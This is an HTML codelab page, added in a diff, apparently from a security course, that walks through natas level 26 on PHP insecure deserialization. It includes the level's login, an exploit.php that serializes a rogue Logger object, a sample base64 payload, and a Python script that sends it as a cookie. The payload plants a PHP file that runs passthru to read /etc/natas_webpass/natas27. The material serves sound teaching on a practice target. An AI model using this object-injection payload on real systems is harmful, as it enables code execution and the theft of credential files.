@@ -1,0 +1,177 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>5.3: Insecure Deserialization (PHP)</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W5.3_insecure_deserialization_php" title="5.3: Insecure Deserialization (PHP)" environment="web" feedback-link="https://docs.google.com/document/d/1TdiiQK4Ka6WFiQp_w89EmL3fdJFgFJfAJr3pYU3U2wI">
+<google-codelab-step label="Introduction" duration="2">
+<p>Deserialization attacks can lead to devastating remote code execution vulnerabilities in web applications. While they are often associated with object-oriented frameworks in which object serialization is a commonly used feature such as Java and Python, they can also occur in PHP and Javascript. </p>
+<h2 is-upgraded><strong>What you will</strong> do</h2>
+<p>In this codelab, you will visit a vulnerable web application and exploit a PHP deserialization vulnerability within it to capture a password. </p>
+<h2 class="checklist" is-upgraded><strong>What you&#39;ll learn</strong></h2>
+<ul class="checklist">
+<li>Exploiting deserialization vulnerabilities in PHP</li>
+</ul>
+<h2 is-upgraded><strong>What you&#39;ll need</strong></h2>
+<ul>
+<li>Access to a PHP interpreter to generate a malicious, serialized PHP object.</li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Vulnerable web application" duration="5">
+<p>The <a href="https://overthewire.org/wargames/natas/" target="_blank">natas CTF</a> provides a scaffolded set of web vulnerability levels that allows one to practice web exploitation. Exploiting a deserialization vulnerability requires knowledge of the underlying programming language as well as the methods it uses to serialize and deserialize objects. Level 26 in the CTF focuses on PHP deserialization attacks.</p>
+<h2 is-upgraded>Visit the level</h2>
+<ul>
+<li>We will be walking through the solution for Level 26.</li>
+<li>The levels use HTTP Basic-Auth for authentication</li>
+<li>Open the following link to go to the level http://natas26:8A506rfIAXbKKk68yJeuTuRq4UfcK70k@natas26.natas.labs.overthewire.org </li>
+<li>Note that if Basic-Auth links are no longer directly clickable in your browser, the credentials we are using are natas26 : 8A506rfIAXbKKk68yJeuTuRq4UfcK70k</li>
+</ul>
+<h2 is-upgraded>Run the application</h2>
+<ul>
+<li>The level takes 2 coordinates and draws a line in between them. Plug in coordinates of your own and draw the first line</li>
+</ul>
+<p class="image-container"><img style="width:356px" src="img/6541ef91bcf6d62f.png"></p>
+<p class="image-container"><img style="width:400px" src="img/c324709b4bf54b04.png"></p>
+<ul>
+<li>Then, draw a different line</li>
+</ul>
+<p class="image-container"><img style="width:355px" src="img/1101e194a354baf3.png"></p>
+<p class="image-container"><img style="width:400px" src="img/489238be8fd9cd25.png"></p>
+<ul>
+<li>We can examine the session in Developer Tools to see how the drawing is handled. In the application tab, find the cookies associated with requests going to and from the server and see that one of its fields is &#39;drawing&#39;<br><img style="width:624px" src="img/4a7d507953b6e20b.png"></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Reverse the cookie" duration="5">
+<p>The cookie associated with the interaction appears to be base64-encoded. In order to see what data it might be using, do the following:</p>
+<ul>
+<li>Copy the cookie value to a file</li>
+</ul>
+<p class="image-container"><img style="width:624px" src="img/90b964c39c86d3f3.png"></p>
+<ul>
+<li>Run a base64 decode operation on the file and show the output (e.g. <code>base64 -d</code> &lt;<code>filename</code>&gt;)</li>
+<li><strong>Highlight the coordinates you entered previously via the UI in the decoded output for your lab notebook</strong></li>
+</ul>
+<p>The web application is passing back a structured object that records the current drawing. In doing so, it keeps the state on the client and does not have to track the state of a client&#39;s drawing itself. It is entirely understandable that this would be done to make the site more scalable.</p>
+<p>The drawing is encoded in Base64 and a cookie field called <code>'drawing'</code> carries the state of the drawing back and forth. After the decoding of the payload, the format looks similar to JSON.</p>
+</google-codelab-step>
+<google-codelab-step label="Analyze the source" duration="5">
+<p>Click on &#34;View sourcecode&#34; to see what is going on in the web application. At the bottom of the file, the HTML for rendering the base page is implemented as well as the PHP code that is initially run. After starting the session, PHP looks for the &#34;drawing&#34; field in the cookie or for coordinates that have been supplied via a form submission specifying the coordinates. If either case happens, three calls are made to <code>drawImage()</code>, <code>showImage()</code>, and <code>storeData()</code> of the image back into the cookie to update it.</p>
+<p class="image-container"><img style="width:624px" src="img/5a5018a5eea76635.png"></p>
+<p><code>drawImage()</code> takes the filename we want to create, then calls <code>drawFromUserdata()</code>.</p>
+<p class="image-container"><img style="width:355px" src="img/cc18e58c91b70ba6.png"></p>
+<p><code>drawFromUserdata()</code> draws an additional line (if one has been specified) and then deserializes <code>$_COOKIE["drawing"]</code> in order redraw the lines that were previously drawn by the user.</p>
+<p class="image-container"><img style="width:555px" src="img/a6739b5112775382.png"></p>
+<p>Then, <code>showImage()</code> simply creates an &lt;<code>img</code>&gt; tag that points to the image that has been produced.</p>
+<p class="image-container"><img style="width:352px" src="img/1639d8d0b44e0792.png"></p>
+<p>Finally, <code>storeData()</code> is called which</p>
+<ol type="1" start="1">
+<li>Creates a new drawing object and adds the new line segment to draw</li>
+</ol>
+<p class="image-container"><img style="width:624px" src="img/dd3015eb3f219c75.png"></p>
+<ol type="1" start="2">
+<li>Deserializes the old drawing specified in the cookie</li>
+</ol>
+<p class="image-container"><img style="width:557px" src="img/a85ab2e0e27343a9.png"></p>
+<ol type="1" start="3">
+<li>Then combines them together before serializing the new drawing and updating the cookie with it.<img style="width:508px" src="img/5edc73ee0eb11415.png"></li>
+</ol>
+</google-codelab-step>
+<google-codelab-step label="Logger class" duration="2">
+<p>The PHP application includes a <code>Logger</code> class whose code will emit information to a file (<code>/tmp/natas26_xxxx.log</code>). In PHP, when specifying a class, one must specify a constructor (<code>__construct()</code>) and a destructor (<code>__destruct()</code>) for objects to run when they are created and destroyed. The constructor, as shown below, opens a log file on the server and writes the <code>initMsg</code> to it. </p>
+<p class="image-container"><img style="width:487px" src="img/2826ac429da2871c.png"></p>
+<p>The destructor opens the log file and writes the <code>exitMsg</code> to it.</p>
+<p class="image-container"><img style="width:319px" src="img/bb46507e37d1facf.png"></p>
+<p>Finally, the <code>log()</code> function opens the log file and writes a given message to it.</p>
+<p class="image-container"><img style="width:319px" src="img/2ea35a21fd1fa023.png"></p>
+</google-codelab-step>
+<google-codelab-step label="Vulnerability and exploit" duration="5">
+<p>When PHP deserializes an object in this level, it does not check the integrity of the data within it. As a result, using the code for the <code>Logger</code> class, a rogue drawing object can trick the application into blindly deserializing a drawing object with a malicious payload attached. Since the PHP script on the server has a <code>Logger</code> class defined, an adversary can send its own serialized instance of a <code>Logger</code> class that will then be deserialized. Calling the constructor and destructor using this instance will then compromise the application. Consider the code below which slightly modifies the <code>Logger</code> class to initialize the values of variables in the constructor to rogue content.</p>
+<pre>  class Logger{
+    ...
+    function __construct($file){
+      $this-&gt;initMsg=&#34;&#34;;
+      $this-&gt;exitMsg=&#34;&lt;?php echo __FILE__; ?&gt;&#34;;
+      $this-&gt;logFile = &#34;img/myphp.php&#34;;
+
+      $fd=fopen($this-&gt;logFile,&#34;a+&#34;);
+      fwrite($fd,$this-&gt;initMsg);
+      fclose($fd);
+    }
+    ...
+  }</pre>
+<p>The constructor for <code>Logger</code> sets the <code>exitMsg</code> to be a small PHP program that echos the name of the PHP file being executed (<code>echo __FILE__;</code>) It then sets the name of the <code>logFile</code> to a file that can be later accessed by the adversary to obtain the results (<code>img/myphp.php</code>).</p>
+</google-codelab-step>
+<google-codelab-step label="Generate malicious serialized object" duration="15">
+<p>Given the PHP code in the previous step, we can create a similar one, but instead have the class execute a command that dumps out the contents of a file that contains the password to get to the next level in <code>/etc/natas_webpass/natas27</code> (a file that should not be accessible!). Within PHP, the <code>passthru</code> function can be used to invoke a shell command (e.g. <code>passthru("cat /etc/natas_webpass/natas27")</code> ).</p>
+<p>Substituting this command into our payload, we can use a PHP script to create a malicious serialized object and base64 encode it in order to allow us to then attach it as the <code>'drawing'</code> object in our cookie. Adapt the script below to create this malicious <code>Logger</code> instance by pointing its logfile to your <code>img/</code>&lt;<code>OdinID</code>&gt;<code>.php</code> and filling in the rest of the class information. The code instantiates an instance of the malicious class, passes the instance to the <code>serialize()</code> call and passes the results of the serialization to the base64 encoder.</p>
+<h3 is-upgraded>exploit.php</h3>
+<pre>&lt;?php
+  class Logger{
+    ...
+    function __construct($file){
+      $this-&gt;initMsg=&#34;&#34;;
+      $this-&gt;exitMsg=&#34;&lt;?php passthru(\&#34;cat /etc/natas_webpass/natas27\&#34;) ?&gt;&#34;;
+      $this-&gt;logFile = &#34;img/&lt;OdinID&gt;.php&#34;;
+
+      $fd=fopen($this-&gt;logFile,&#34;a+&#34;);
+      fwrite($fd,$this-&gt;initMsg);
+      fclose($fd);
+    }
+    ...
+  }
+  print base64_encode(serialize(new Logger(&#39;&#39;)));
+?&gt;</pre>
+<p>On a Linux machine, run the PHP interpreter on the script to produce the payload that we can then attach in the cookie to launch our exploit. Note that if using your own Linux VM, you may need to install PHP to run the interpreter:</p>
+<pre><code>sudo apt install php
+php exploit.php</code></pre>
+<p>The script will output the base64-encoded payload that can be included into the cookie.</p>
+<p>As an example, the <code>Logger</code> class that performs the simple <code>echo</code> has a serialized representation shown below:</p>
+<pre><code>O:6:&#34;Logger&#34;:3:{s:15:&#34;LoggerlogFile&#34;;s:13:&#34;img/myphp.php&#34;;s:15:&#34;LoggerinitMsg&#34;;s:0:&#34;&#34;;s:15:&#34;LoggerexitMsg&#34;;s:23:&#34;&lt;?php echo __FILE__; ?&gt;&#34;;}</code></pre>
+<p>After base64-encoding, it will then generate the payload below which can be attached to the cookie for the level.</p>
+<pre><code>Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL215cGhwLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjIzOiI8P3BocCBlY2hvIF9fRklMRV9fOyA/PiI7fQ==</code></pre>
+</google-codelab-step>
+<google-codelab-step label="Send exploit" duration="3">
+<p>To perform the exploit, we now need to attach our serialized object as our &#34;drawing&#34;. This can be done programmatically via Python. In the below code, the &lt;<code>FMI</code>&gt; is the <code>base64_encoded_serialized_object</code> generated in the previous step.</p>
+<pre>#!/bin/python3
+import requests
+url = &#39;http://natas26.natas.labs.overthewire.org/&#39;
+
+mycookies={&#39;drawing&#39;:&#39;&lt;FMI&gt;&#39;}
+r = requests.get(url,auth=(&#39;natas26&#39;,&#39;&lt;natas26_pass&gt;&#39;),cookies=mycookies)</pre>
+</google-codelab-step>
+<google-codelab-step label="Win!" duration="1">
+<p>Access the file that you created via the malicious Logger class from your web browser to reveal the password to natas27. </p>
+<ul>
+<li><strong>Take a screenshot of it with your OdinID to include in your lab notebook.</strong></li>
+</ul>
+<p>Visit <a href="http://natas27.natas.labs.overthewire.org/" target="_blank">http://natas27.natas.labs.overthewire.org/</a> and enter the password to get to the next level. </p>
+<ul>
+<li><strong>Take another screenshot with your OdinID in the Username field for your lab notebook.</strong></li>
+</ul>
+<h2 is-upgraded><strong>Congratulations</strong></h2>
+<p>You&#39;ve completed the PHP deserialization lab covering</p>
+<ul>
+<li>How object deserialization works in PHP</li>
+<li>How an insecure deserialization that evaluates objects as code can lead to vulnerabilities</li>
+<li>How to exploit insecure deserialization to gain unauthorized access</li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
